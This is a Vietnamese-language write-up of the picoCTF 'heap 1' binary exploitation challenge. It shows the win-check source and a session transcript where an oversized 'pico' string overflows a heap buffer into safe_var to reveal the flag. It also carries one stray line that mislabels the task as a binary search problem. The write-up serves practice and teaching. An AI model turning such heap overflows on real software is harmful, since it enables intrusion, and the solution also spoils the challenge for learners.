# heap 1
##### Tags: `Binary Exploitation`
### DESCRIPTION
Can you control your overflow? Download the binary [here](https://artifacts.picoctf.net/c_tethys/35/chall). Download the [source](https://artifacts.picoctf.net/c_tethys/35/chall.c) here.
Additional details will be available after launching your challenge instance.
##### Một bài về thuật toán tìm kiếm Binary Search.
> Về cơ bản, lỗi giống heap 0, khi chèn data lớn quá thì sẽ bị 'đẩy' sang bên `safe_var`
##### Kiểm tra file `chall.c`, sẽ thấy để thắng thì `safe_var` phải là 'pico'.
```C
void check_win() {
    if (!strcmp(safe_var, "pico")) {
        printf("\nYOU WIN\n");

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);

        exit(0);
    } else {
        printf("Looks like everything is still secure!\n");
        printf("\nNo flage for you :(\n");
        fflush(stdout);
    }
}
                   
```
##### Như vậy, ta vẫn sẽ sử dụng một string dài tuy nhiên độ dài vừa đủ để phần tràn vào `safe_var` là pico:
```
Welcome to heap1!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x558909aef6b0  ->   pico
+-------------+----------------+
[*]   0x558909aef6d0  ->   bico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 2
Data for buffer: picopicopicopicopicopicopicopicopico

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 3


Take a look at my variable: safe_var = pico


1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 
```
##### Chọn 4 để in flag.
##### => Lấy flag thành công!
